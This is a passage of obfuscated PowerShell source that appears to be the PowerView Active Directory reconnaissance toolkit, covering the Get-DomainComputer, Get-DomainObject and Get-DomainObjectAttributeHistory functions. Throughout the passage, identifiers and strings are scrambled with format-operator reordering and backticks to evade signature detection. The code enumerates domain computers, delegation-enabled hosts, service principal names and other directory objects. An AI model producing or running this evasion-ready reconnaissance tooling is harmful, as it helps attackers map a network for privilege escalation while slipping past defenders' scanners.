        if (${pSbO`UnD`P`ARaMe`T`erS}[("{3}{0}{1}{2}" -f 'er','T','imeLimit','Serv')]) { ${sE`ARCheRA`RgUme`N`Ts}[("{1}{2}{0}"-f'eLimit','ServerT','im')] = ${s`ErveRTi`M`EL`iMiT} }
        if (${PsBoUn`Dp`A`RaME`TERs}[("{2}{0}{1}" -f 'ecurity','Masks','S')]) { ${Sea`R`ch`erA`RGUMENts}[("{1}{0}{3}{2}" -f'r','Secu','tyMasks','i')] = ${SecUR`iT`y`M`AsKs} }
        if (${PSBo`UNDpA`R`AMeT`eRs}[("{0}{1}" -f 'Tombs','tone')]) { ${s`eArC`herarGu`ME`NTs}[("{1}{2}{0}"-f'tone','To','mbs')] = ${t`oMBsT`One} }
        if (${PsboundpA`R`Amet`Ers}[("{1}{0}{2}"-f'nti','Crede','al')]) { ${S`eArCh`erarG`UM`E`Nts}[("{1}{0}{2}" -f'ia','Credent','l')] = ${CRe`d`ENtiaL} }
        ${comps`Ea`R`Ch`er} = &("{4}{2}{1}{0}{3}"-f'rche','a','et-DomainSe','r','G') @SearcherArguments
    }

    PROCESS {
        
        if (${Psbou`N`DPaRA`mE`TERs} -and (${P`S`Bo`UND`P`ARametErs}."C`oUNT" -ne 0)) {
            &("{1}{4}{2}{3}{5}{0}"-f'ter','New-D','m','icParam','yna','e') -CreateVariables -BoundParameters ${pSBO`Un`dPArA`mETERs}
        }

        if (${co`m`PSEARchER}) {
            ${iDENTIT`YFI`l`TER} = ''
            ${f`iLtER} = ''
            ${i`D`ENtity} | &("{2}{1}{3}{0}" -f'ject','e-','Wher','Ob') {${_}} | &("{1}{3}{0}{2}" -f 'jec','ForEa','t','ch-Ob') {
                ${ID`E`NTi`TY`inst`AnCE} = ${_}.("{0}{1}{2}" -f'R','ep','lace').Invoke('(', '\28').("{0}{2}{1}"-f'Rep','ce','la').Invoke(')', '\29')
                if (${ide`NTIt`yi`NStance} -match ("{1}{0}"-f'S-1-','^')) {
                    ${iDe`NtiTy`FiL`TER} += "(objectsid=$IdentityInstance)"
                }
                elseif (${Iden`TITy`i`NSTAncE} -match ("{0}{1}"-f '^C','N=')) {
                    ${IdentiTy`F`I`LTeR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${p`s`BouNDpAR`AMEt`ers}[("{1}{0}" -f'n','Domai')]) -and (-not ${psBoUNDp`A`R`Ame`T`eRS}[("{2}{0}{1}" -f 'rchBa','se','Sea')])) {
                        
                        
                        ${I`DenT`It`YD`OMain} = ${iDE`NtITY`iN`sTan`Ce}.("{1}{0}{3}{2}" -f 'S','Sub','ng','tri').Invoke(${IDEn`TItyiN`st`AncE}.("{0}{2}{1}" -f 'I','f','ndexO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{3}{1}{2}{0}" -f 'se','rb','o','Write-Ve') ('['+'Get-Do'+'mainCompu'+'ter'+'] '+'E'+'xtrac'+'te'+'d '+'d'+'om'+'ain '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${S`ea`RCH`ERargUMEntS}[("{1}{0}" -f 'main','Do')] = ${iDe`N`TI`Tydom`AIn}
                        ${c`OMPsEArC`H`ER} = &("{4}{5}{2}{0}{3}{1}" -f'arc','r','ainSe','he','Get','-Dom') @SearcherArguments
                        if (-not ${C`O`mpS`EaRC`hEr}) {
                            &("{1}{3}{2}{0}"-f 'rning','Wr','Wa','ite-') ('[Get-D'+'omai'+'nCompu'+'ter] '+'Unabl'+'e '+'to'+' '+'re'+'tri'+'eve '+'d'+'omain '+'searc'+'h'+'er'+' '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${Id`e`NtIty`iNs`TA`NCe}.("{1}{0}" -f 'ns','Contai').Invoke('.')) {
                    ${I`dENt`itY`Fi`LTEr} += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif (${IdENtI`TY`INs`TanCe} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${gUid`By`TEStrIng} = (([Guid]${IdEnTI`T`YinS`TANcE}).("{0}{2}{1}"-f'To','ray','ByteAr').Invoke() | &("{3}{0}{2}{1}" -f'-Obj','t','ec','ForEach') { '\' + ${_}.("{1}{2}{0}" -f'ing','ToS','tr').Invoke('X2') }) -join ''
                    ${I`d`enTItyf`ILTEr} += "(objectguid=$GuidByteString)"
                }
                else {
                    ${idenTi`T`yfi`l`TEr} += "(name=$IdentityInstance)"
                }
            }
            if (${i`DeN`TiTyfI`LTer} -and (${Iden`TI`TY`FilTER}.("{1}{0}" -f 'im','Tr').Invoke() -ne '') ) {
                ${F`iLTEr} += "(|$IdentityFilter)"
            }

            if (${ps`B`oUnd`paR`A`meTERS}[("{2}{1}{0}{3}"-f 'onst','nc','U','rained')]) {
                &("{0}{1}{2}"-f'Wri','te-Verb','ose') ("{2}{16}{1}{11}{21}{4}{15}{20}{9}{8}{14}{10}{12}{7}{19}{13}{0}{17}{3}{23}{6}{22}{5}{18}"-f'u','in','[','co','ter]','leg','trained ','s wit','in','h','te','Co','r','or ','g for compu',' Sea','Get-Doma','n','ation','h f','rc','mpu','de','ns')
                ${FiL`TeR} += (("{10}{12}{3}{7}{5}{9}{6}{8}{0}{2}{11}{1}{4}" -f'4.8','24288','0','ntrol:1.2.8',')','3556','1','40.11','.','.','(us','3:=5','erAccountCo'))
            }
            if (${P`s`Bo`Und`Pa`RAmeTeRS}[("{1}{0}{2}{3}"-f'stedTo','Tru','A','uth')]) {
                &("{0}{3}{4}{2}{1}"-f 'Wr','se','bo','ite-V','er') ("{0}{27}{21}{17}{22}{4}{13}{12}{16}{18}{2}{10}{3}{24}{14}{1}{11}{23}{8}{15}{19}{20}{6}{26}{5}{25}{7}{9}"-f '[Get-DomainCo','e','puter','that',' Sear','ate f',' a','ther','r',' principals','s ',' ','ing fo','ch','ar','ust','r','er',' com','e','d to','t',']','t',' ','or o','uthentic','mpu')
                ${f`ilTEr} += (("{5}{3}{7}{1}{2}{4}{6}{0}" -f 'ateto=*)','ed','tode','allo','le','(msds-','g','w'))
            }
            if (${PSBoU`N`D`PARAmeTE`RS}[("{2}{0}{1}" -f 'rinte','rs','P')]) {
                &("{3}{2}{1}{0}" -f'e','s','rite-Verbo','W') ("{6}{2}{4}{1}{8}{7}{5}{0}{3}" -f'in','er','t-DomainCo','g for printers','mput','h','[Ge','arc','] Se')
                ${Fi`LT`ER} += ("{3}{5}{2}{7}{4}{0}{1}{6}"-f 'print','Q','bjectC','(','=','o','ueue)','ategory')
            }
            if (${psB`OUn`DP`ARameT`e`Rs}['SPN']) {
                &("{0}{2}{1}" -f'Write','erbose','-V') ('[Ge'+'t'+'-D'+'omainC'+'ompute'+'r] '+'S'+'e'+'arching '+'fo'+'r '+'comput'+'e'+'rs '+'w'+'ith '+'SP'+'N: '+"$SPN")
                ${fIl`T`eR} += "(servicePrincipalName=$SPN)"
            }
            if (${PsBo`U`NDpAR`AMeT`E`RS}[("{1}{3}{0}{2}" -f 'S','Ope','ystem','rating')]) {
                &("{3}{1}{0}{2}"-f 'erbos','te-V','e','Wri') ('[Get-Dom'+'ai'+'nCompu'+'ter] '+'Sear'+'chi'+'ng '+'fo'+'r '+'comp'+'uters'+' '+'with'+' '+'op'+'erati'+'ng '+'s'+'ystem'+': '+"$OperatingSystem")
                ${fiL`T`eR} += "(operatingsystem=$OperatingSystem)"
            }
            if (${ps`Bo`UNd`p`ArAm`ETErS}[("{0}{3}{1}{2}"-f'S','rv','icePack','e')]) {
                &("{0}{1}{3}{2}{4}"-f'Wr','it','Ver','e-','bose') ('['+'G'+'et-Domai'+'nC'+'ompute'+'r] '+'Search'+'ing'+' '+'f'+'or '+'com'+'pute'+'rs '+'wi'+'th '+'ser'+'v'+'ice '+'pa'+'ck: '+"$ServicePack")
                ${f`ILT`ER} += "(operatingsystemservicepack=$ServicePack)"
            }
            if (${pSB`oU`ND`pAra`MeT`ErS}[("{2}{1}{0}" -f'Name','te','Si')]) {
                &("{3}{2}{1}{0}"-f 'e','rbos','Ve','Write-') ('[Get-Dom'+'ai'+'nCompu'+'t'+'er] '+'S'+'earching'+' '+'f'+'or '+'compu'+'te'+'r'+'s '+'wit'+'h '+'site'+' '+'nam'+'e:'+' '+"$SiteName")
                ${Fi`L`TEr} += "(serverreferencebl=$SiteName)"
            }
            if (${PS`B`ou`Nd`PARAMEteRs}[("{0}{1}{2}" -f'LDAPFil','t','er')]) {
                &("{0}{2}{1}{3}" -f'W','r','rite-Ve','bose') ('['+'G'+'e'+'t-D'+'omainCompute'+'r]'+' '+'Us'+'in'+'g '+'a'+'d'+'ditiona'+'l '+'LD'+'AP '+'filt'+'er: '+"$LDAPFilter")
                ${f`IL`TEr} += "$LDAPFilter"
            }
            
            ${u`ACFilt`ER} | &("{3}{2}{0}{1}" -f 'Objec','t','re-','Whe') {${_}} | &("{2}{1}{0}"-f 'ach-Object','orE','F') {
                if (${_} -match ("{0}{1}"-f'NO','T_.*')) {
                    ${uA`C`FI`ElD} = ${_}.("{0}{2}{1}"-f 'Substri','g','n').Invoke(4)
                    ${uAcV`AlUe} = [Int](${u`Ac`ENum}::${uAcF`I`ELd})
                    ${f`ILter} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${U`AC`VAlUE} = [Int](${UA`c`eNum}::${_})
                    ${fi`lt`ER} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${COMpSEA`RcH`eR}."f`I`LTeR" = "(&(samAccountType=805306369)$Filter)"
            &("{1}{2}{3}{0}"-f 'se','Writ','e-','Verbo') "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter) "

            if (${Psb`oUNd`P`ARame`TErS}[("{1}{0}{2}" -f'n','FindO','e')]) { ${R`E`sULts} = ${CO`MPS`eARCh`er}.("{0}{1}"-f'Fi','ndOne').Invoke() }
            else { ${REsul`TS} = ${C`OmPSEA`RcH`er}.("{1}{0}"-f'ndAll','Fi').Invoke() }
            ${RES`U`LtS} | &("{1}{2}{0}" -f'ject','Where','-Ob') {${_}} | &("{3}{0}{2}{1}" -f'orE','ject','ach-Ob','F') {
                ${UP} = ${T`RUE}
                if (${p`sbOu`NDParAmE`TERs}[("{1}{0}" -f'ing','P')]) {
                    ${Up} = &("{1}{3}{2}{0}" -f'ion','Test-C','nnect','o') -Count 1 -Quiet -ComputerName ${_}."Prope`R`TIeS"."dnS`HO`S`TNAme"
                }
                if (${Up}) {
                    if (${P`SBOUNdPA`RAME`Ters}['Raw']) {
                        
                        ${COmPu`T`er} = ${_}
                        ${co`m`PuTer}."pSOBj`E`Ct"."t`YP`eNAmEs".("{0}{1}"-f 'Inse','rt').Invoke(0, ("{4}{3}{5}{2}{1}{0}{6}"-f'r.','e','omput','ew','PowerVi','.C','Raw'))
                    }
                    else {
                        ${CO`m`pUter} = &("{3}{1}{4}{0}{2}"-f 'Prope','vert-LDA','rty','Con','P') -Properties ${_}."pRO`pErTi`Es"
                        ${CO`m`pUTer}."psOBj`e`CT"."t`Y`p`enAmES".("{1}{0}{2}" -f 'r','Inse','t').Invoke(0, ("{1}{0}{3}{2}" -f 'rV','Powe','omputer','iew.C'))
                    }
                    ${CO`MPu`Ter}
                }
            }
            if (${R`esUltS}) {
                try { ${R`esUL`TS}.("{1}{0}{2}"-f 'i','d','spose').Invoke() }
                catch {
                    &("{2}{1}{0}{4}{3}" -f 'b','te-Ver','Wri','se','o') ('[Get-D'+'omainCo'+'mp'+'ute'+'r]'+' '+'Er'+'ror '+'disp'+'o'+'sing '+'of'+' '+'th'+'e '+'Resu'+'lts '+'ob'+'ject:'+' '+"$_")
                }
            }
            ${com`pSEA`RC`h`eR}.("{0}{1}" -f 'dispo','se').Invoke()
        }
    }
}


function GET-dO`ma`In`OB`JeCt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{2}{4}{5}{0}" -f'signments','sMo','r','PSUseDeclaredVar','e','ThanAs'}, '')]
    [OutputType({"{4}{5}{0}{3}{2}{1}" -f 'View.A','ect','Obj','D','P','ower'})]
    [OutputType({"{2}{1}{0}{4}{5}{3}"-f 'iew.ADO','owerV','P','ect.Raw','b','j'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSItION = 0, vALUefRompIpELIne = ${T`RUe}, VALuefrOMPIpeliNEByproPertyNAmE = ${TR`Ue})]
        [Alias({"{1}{3}{4}{2}{0}"-f'dName','D','e','isti','nguish'}, {"{1}{0}{4}{3}{2}"-f'amAc','S','Name','t','coun'}, {"{0}{1}"-f 'Na','me'}, {"{3}{4}{0}{2}{1}" -f 'ng','ame','uishedN','MemberD','isti'}, {"{1}{0}{2}"-f 'am','MemberN','e'})]
        [String[]]
        ${id`EN`TItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`maiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'ter','Fil'})]
        [String]
        ${l`dAp`F`ilteR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${prOpERT`i`ES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'h','ADSPat'})]
        [String]
        ${sea`R`chbaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{2}{0}{4}" -f'ontro','Do','nC','mai','ller'})]
        [String]
        ${s`eRveR},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{1}{0}{2}" -f'e','OneL','vel'}, {"{1}{0}" -f 'ee','Subtr'})]
        [String]
        ${sEaRcH`S`c`oPe} = ("{1}{0}" -f'tree','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${REsultPAg`e`SizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sER`V`eRtimE`lIMit},

        [ValidateSet({"{0}{1}"-f 'D','acl'}, {"{1}{0}"-f'up','Gro'}, {"{1}{0}"-f 'one','N'}, {"{0}{1}" -f 'Owne','r'}, {"{0}{1}" -f 'Sa','cl'})]
        [String]
        ${seCurI`T`Y`mAskS},

        [Switch]
        ${tomBst`o`Ne},

        [Alias({"{1}{0}{2}"-f'n','ReturnO','e'})]
        [Switch]
        ${F`in`DONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`dENt`Ial} =  (&('gi') ("{0}{1}{2}"-f 'VarIabL','E:5R0','Vk')  )."VAL`Ue"::"Em`pty",

        [Switch]
        ${r`AW}
    )

    DynamicParam {
        ${u`AcVAlU`enAM`eS} =   ${0`Bz}::("{0}{2}{1}"-f 'Ge','s','tName').Invoke(${Ua`c`enUm})
        
        ${ua`CvalUE`NaM`es} = ${UACvaLUE`N`A`m`es} | &("{3}{0}{2}{1}" -f'c','bject','h-O','ForEa') {${_}; "NOT_$_"}
        
        &("{0}{2}{4}{1}{3}"-f'New-D','mete','ynam','r','icPara') -Name ("{3}{1}{2}{0}"-f'er','i','lt','UACF') -ValidateSet ${u`AC`Value`NaMes} -Type ([array])
    }

    BEGIN {
        ${s`eARC`HERar`gumen`Ts} = @{}
        if (${P`SbOunDPa`RA`meTeRs}[("{0}{1}" -f 'Dom','ain')]) { ${s`eArcH`e`RarGUMEN`TS}[("{1}{0}"-f 'main','Do')] = ${dOmA`IN} }
        if (${psB`O`U`N`dpArAMe`TERs}[("{0}{2}{1}" -f 'Pro','ies','pert')]) { ${SE`A`RChe`RArgUMents}[("{2}{1}{0}" -f 'ties','r','Prope')] = ${p`Rope`RT`ies} }
        if (${pSBoundPaRA`MeT`E`RS}[("{1}{0}{2}" -f'a','Se','rchBase')]) { ${S`eaRCHEra`Rgu`m`e`Nts}[("{2}{0}{1}" -f'c','hBase','Sear')] = ${SEARc`h`BaSE} }
        if (${psb`OUn`dpA`RAMeTerS}[("{1}{0}" -f 'rver','Se')]) { ${S`EArcHE`Ra`RGumEnts}[("{1}{0}"-f'r','Serve')] = ${Serv`eR} }
        if (${p`sBOUnD`p`ArAmeTerS}[("{0}{2}{3}{1}"-f'S','chScope','e','ar')]) { ${S`earCheRar`gU`men`TS}[("{3}{0}{1}{2}"-f 'rc','hScop','e','Sea')] = ${Se`ARc`HsC`OPe} }
        if (${psbO`UnDpa`R`AmEterS}[("{2}{0}{1}" -f 'ultP','ageSize','Res')]) { ${s`ea`R`cHeraRGUMENts}[("{2}{1}{0}"-f'ageSize','ltP','Resu')] = ${r`ES`UltPAg`Esi`ze} }
        if (${PSBo`U`N`dPA`Ra`MeTERS}[("{3}{0}{1}{2}"-f'rTi','meLim','it','Serve')]) { ${SeA`Rchera`R`g`UM`entS}[("{2}{3}{0}{1}" -f'm','it','ServerTimeL','i')] = ${SeRV`Er`Timeli`M`It} }
        if (${p`S`Bo`Un`dparAmeters}[("{1}{0}{3}{4}{2}"-f 'ecuri','S','s','tyMas','k')]) { ${se`ArChE`RArgUMe`Nts}[("{1}{0}{4}{3}{2}"-f 'uri','Sec','s','yMask','t')] = ${sECur`i`TYm`AS`ks} }
        if (${psBOUND`PaRa`M`ET`E`Rs}[("{0}{2}{1}"-f'Tom','one','bst')]) { ${Sea`Rc`He`R`ArGumENtS}[("{1}{2}{0}"-f 'bstone','T','om')] = ${t`OM`Bstone} }
        if (${P`SboUNdPaRam`ET`ERs}[("{0}{2}{1}"-f'Crede','l','ntia')]) { ${s`Ear`cH`ERA`RGumEnts}[("{1}{0}{2}" -f 'i','Credent','al')] = ${CreDen`TI`AL} }
        ${O`Bj`EC`TsEaRCh`ER} = &("{3}{2}{0}{4}{1}{5}" -f 'om','nS','-D','Get','ai','earcher') @SearcherArguments
    }

    PROCESS {
        
        if (${Ps`B`oUnDPAr`AmetERs} -and (${P`sbOund`PaRAmE`TeRS}."Co`Unt" -ne 0)) {
            &("{0}{2}{5}{1}{3}{4}"-f 'New','arame','-','te','r','DynamicP') -CreateVariables -BoundParameters ${P`SBoUnDP`ARamE`Te`Rs}
        }
        if (${o`BjEct`SEArChEr}) {
            ${IDEntit`Y`F`ilT`eR} = ''
            ${F`ILtER} = ''
            ${iDE`NT`ITY} | &("{3}{2}{1}{0}"-f'ct','Obje','e-','Wher') {${_}} | &("{0}{3}{2}{1}"-f'ForE','ject','b','ach-O') {
                ${Id`E`NTiTyInstAn`ce} = ${_}.("{2}{1}{0}"-f'ace','l','Rep').Invoke('(', '\28').("{0}{1}"-f'Repl','ace').Invoke(')', '\29')
                if (${IdentIt`yi`NST`A`NCE} -match ("{0}{1}" -f'^S','-1-')) {
                    ${id`En`TITYfIL`TeR} += "(objectsid=$IdentityInstance)"
                }
                elseif (${i`DenT`iTyi`Nstan`Ce} -match ((("{1}{0}{2}"-f 'nzDC','^(CNDnzOUD',')=')).("{2}{0}{1}"-f'L','Ace','ReP').Invoke('Dnz','|'))) {
                    ${idENti`TYfi`Lt`er} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${pS`BOund`ParAMEtE`Rs}[("{0}{1}"-f 'D','omain')]) -and (-not ${PsbO`UnDP`ARAMEt`ers}[("{1}{0}{2}"-f 'c','Sear','hBase')])) {
                        
                        
                        ${ideNt`ityD`oma`in} = ${Ide`NT`ity`INsTAncE}.("{0}{1}{2}" -f 'SubS','t','ring').Invoke(${i`DeNTITYiNS`TA`Nce}.("{2}{0}{1}" -f 'O','f','Index').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{2}{1}{4}{0}{3}"-f'os','it','Wr','e','e-Verb') ('[G'+'et-Do'+'mainObje'+'ct] '+'Extrac'+'te'+'d '+'d'+'om'+'ain '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${sEarCHe`RARgu`mEn`Ts}[("{1}{0}" -f'ain','Dom')] = ${iDenTit`Y`DO`MA`IN}
                        ${oB`JeCT`se`ARChEr} = &("{3}{4}{2}{1}{0}" -f 'nSearcher','omai','t-D','G','e') @SearcherArguments
                        if (-not ${obj`eCT`sEARcHEr}) {
                            &("{2}{1}{3}{0}" -f 'rning','te','Wri','-Wa') ('['+'Get'+'-DomainObje'+'ct'+'] '+'U'+'nable '+'to'+' '+'retr'+'ieve'+' '+'domain'+' '+'sea'+'rc'+'her '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${IDe`Nti`TyIn`STAnce} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${G`UiDBY`Tes`TRI`Ng} = (([Guid]${ide`NT`itYin`s`T`AncE}).("{0}{1}{2}"-f 'ToByteAr','ra','y').Invoke() | &("{1}{0}{2}"-f'ec','ForEach-Obj','t') { '\' + ${_}.("{0}{1}{2}" -f 'ToStri','n','g').Invoke('X2') }) -join ''
                    ${ideNTItYfil`T`er} += "(objectguid=$GuidByteString)"
                }
                elseif (${ide`Nt`iTyiNSTA`N`cE}.("{1}{0}"-f 'ontains','C').Invoke('\')) {
                    ${CONVeRtEDID`E`Nt`I`T`Yi`NStaNCe} = ${iDEnT`IT`yI`N`sTaNCE}.("{2}{1}{0}"-f 'place','e','R').Invoke('\28', '(').("{1}{2}{0}" -f'place','R','e').Invoke('\29', ')') | &("{3}{4}{2}{0}{1}"-f '-A','DName','rt','Co','nve') -OutputType ("{1}{0}{2}" -f 'ic','Canon','al')
                    if (${C`ONve`R`Ted`i`DeNT`I`TyinStan`ce}) {
                        ${Ob`J`eCTDOm`AIN} = ${CONV`E`RtEdI`De`N`TiTY`insta`Nce}.("{2}{0}{1}"-f 'ubSt','ring','S').Invoke(0, ${c`O`Nv`erte`didEnT`ITYI`N`s`TANCe}.("{2}{0}{1}" -f 'ex','Of','Ind').Invoke('/'))
                        ${O`BjECTn`A`Me} = ${ID`ENtitY`INSt`ANCe}.("{1}{0}" -f 'lit','Sp').Invoke('\')[1]
                        ${I`dENTI`TYfIlTeR} += "(samAccountName=$ObjectName)"
                        ${S`e`ArCHERArGUm`ents}[("{1}{0}{2}"-f 'mai','Do','n')] = ${oB`jE`cTD`oMa`in}
                        &("{1}{2}{3}{0}"-f 'e','Write','-V','erbos') ('['+'Get'+'-Do'+'main'+'O'+'bject] '+'Ex'+'t'+'r'+'acted '+'dom'+'ain '+"'$ObjectDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${oBjEc`T`S`eArcHEr} = &("{0}{4}{2}{1}{3}" -f 'G','Searc','main','her','et-Do') @SearcherArguments
                    }
                }
                elseif (${I`dEnTI`TYInS`TA`NCe}.("{2}{0}{1}" -f 'tain','s','Con').Invoke('.')) {
                    ${IDEn`Ti`Ty`FIl`TEr} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    ${ide`N`TI`TyfIltER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (${I`DEnTIt`YfIlT`Er} -and (${Id`eN`Tit`y`FILTEr}.("{1}{0}"-f 'im','Tr').Invoke() -ne '') ) {
                ${F`il`Ter} += "(|$IdentityFilter)"
            }

            if (${p`S`Bo`UnDPAramET`E`RS}[("{1}{2}{0}"-f 'Filter','LD','AP')]) {
                &("{0}{1}{2}" -f 'Writ','e-Verb','ose') ('[Ge'+'t-Dom'+'a'+'i'+'n'+'Object] '+'Usi'+'ng'+' '+'ad'+'ditional'+' '+'LD'+'AP '+'filt'+'er: '+"$LDAPFilter")
                ${f`iLTeR} += "$LDAPFilter"
            }

            
            ${UAcF`i`LT`Er} | &("{0}{2}{3}{1}"-f 'Whe','ect','re','-Obj') {${_}} | &("{2}{0}{1}"-f'rEa','ch-Object','Fo') {
                if (${_} -match ("{1}{2}{0}" -f'.*','N','OT_')) {
                    ${Uac`F`IelD} = ${_}.("{0}{1}{2}" -f 'Su','bs','tring').Invoke(4)
                    ${u`ACval`UE} = [Int](${uAC`e`Num}::${UA`c`FI`ELd})
                    ${Fi`Lt`er} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${U`A`CVALUe} = [Int](${uaCE`N`Um}::${_})
                    ${F`iL`Ter} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            if (${f`iLTER} -and ${FiLt`Er} -ne '') {
                ${ob`jECtsE`ARcHER}."fI`lteR" = "(&$Filter)"
            }
            &("{2}{0}{3}{1}" -f 'Ver','e','Write-','bos') "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter) "

            if (${Ps`BOu`N`D`PaRAMetERs}[("{0}{1}" -f'Fi','ndOne')]) { ${RES`U`LTS} = ${o`Bj`eC`TSEArCHeR}.("{1}{2}{0}"-f'One','Fi','nd').Invoke() }
            else { ${RESUL`Ts} = ${OB`j`eCtSearch`er}.("{1}{2}{0}"-f 'll','F','indA').Invoke() }
            ${R`Esu`LtS} | &("{2}{1}{0}" -f'ect','ere-Obj','Wh') {${_}} | &("{3}{1}{0}{2}"-f 'bje','O','ct','ForEach-') {
                if (${P`sBoUND`P`ArAmet`eRs}['Raw']) {
                    
                    ${O`BJE`ct} = ${_}
                    ${ob`J`ecT}."pS`OB`jEcT"."ty`Pe`NAMeS".("{0}{1}" -f 'Inse','rt').Invoke(0, ("{1}{4}{5}{0}{2}{3}"-f'.','Power','Ra','w','View.','ADObject'))
                }
                else {
                    ${OBje`ct} = &("{2}{4}{0}{3}{1}{5}" -f'r','LDA','Co','t-','nve','PProperty') -Properties ${_}."prop`er`TIeS"
                    ${obj`eCT}."p`sOB`JEct"."ty`P`EnAMES".("{0}{1}"-f'Inse','rt').Invoke(0, ("{3}{1}{2}{0}{4}"-f'b','View.','ADO','Power','ject'))
                }
                ${ob`jE`cT}
            }
            if (${RES`U`ltS}) {
                try { ${R`eS`ULTs}.("{0}{2}{1}"-f 'd','se','ispo').Invoke() }
                catch {
                    &("{0}{3}{2}{1}" -f 'Writ','e','erbos','e-V') ('[Get-D'+'omain'+'Object]'+' '+'Erro'+'r '+'di'+'sposing'+' '+'o'+'f '+'t'+'he '+'Res'+'u'+'lts '+'obje'+'ct: '+"$_")
                }
            }
            ${ob`jEctSearC`HER}.("{0}{1}" -f'd','ispose').Invoke()
        }
    }
}


function g`e`T-`domAi`NObJEcTATtrIbUtE`hiSto`Ry {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{4}{7}{2}{5}{3}{8}{6}" -f 'Us','PS','edV','anAssi','eD','arsMoreTh','ts','eclar','gnmen'}, '')]
    [OutputType({"{5}{1}{3}{0}{4}{2}{6}" -f 'ibuteH','iew.ADObjec','r','tAttr','isto','PowerV','y'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSITION = 0, vALuefROmpIpELIne = ${tR`UE}, VALueFroMPIpeLINEByproPERTYNAme = ${tr`UE})]
        [Alias({"{3}{2}{0}{1}{4}" -f 'n','guishe','ti','Dis','dName'}, {"{4}{0}{2}{3}{1}" -f'Acco','me','u','ntNa','Sam'}, {"{0}{1}"-f 'Nam','e'}, {"{3}{0}{1}{6}{2}{5}{4}" -f't','i','shedN','MemberDis','e','am','ngui'}, {"{0}{2}{1}"-f 'Membe','Name','r'})]
        [String[]]
        ${iDe`N`TiTY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${doM`A`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'F','ilter'})]
        [String]
        ${LD`APFIL`TEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`R`Ope`RtiEs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f 'ADSP','th','a'})]
        [String]
        ${S`eArc`hBaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{0}{1}" -f'ntrolle','r','Do','mainCo'})]
        [String]
        ${SE`R`VER},

        [ValidateSet({"{0}{1}"-f 'Bas','e'}, {"{1}{0}" -f 'l','OneLeve'}, {"{1}{0}" -f 'ree','Subt'})]
        [String]
        ${SEa`RCH`S`COpE} = ("{2}{0}{1}" -f'bt','ree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEs`UL`Tpa`GE`sIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${ServerTI`MELi`M`IT},

        [Switch]
        ${t`oMbsTO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREDE`Nt`i`AL} =  ( &("{0}{2}{1}"-f'get-va','BLe','RIA')  ('5R0V'+'k') -VAlUe)::"EMp`Ty",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${SeARcheRA`Rg`U`mENts} = @{
            ("{1}{2}{0}" -f'es','Prope','rti')    =   ("{3}{7}{0}{4}{5}{2}{1}{8}{6}"-f '-r','bute','attri','ms','ep','l','ata','ds','metad'),("{2}{5}{3}{0}{1}{4}" -f'uishedna','m','dist','g','e','in')
            'Raw'           =   ${TR`UE}
        }
        if (${PSbo`UNDpAra`mEt`ERs}[("{0}{1}" -f'Domai','n')]) { ${s`ear`CH`ErArG`UmeNts}[("{2}{0}{1}"-f 'a','in','Dom')] = ${DO`MaiN} }
        if (${Psbo`UNDp`A`RAMet`ERs}[("{2}{1}{0}" -f 'ilter','DAPF','L')]) { ${sEA`RcheRA`Rg`UMENTS}[("{2}{0}{1}" -f 'DAPF','ilter','L')] = ${ldAP`Filt`ER} }
        if (${psBouN`DP`AR`AmeTers}[("{2}{0}{1}" -f 'ar','chBase','Se')]) { ${S`earC`HERA`R`gumEnTS}[("{1}{2}{3}{0}"-f 'ase','S','earc','hB')] = ${sEArc`Hba`se} }
        if (${pS`Bo`UNdPAr`AmeTerS}[("{0}{1}" -f 'Serv','er')]) { ${S`Earch`era`RGuMEnts}[("{1}{0}" -f'rver','Se')] = ${SEr`VeR} }
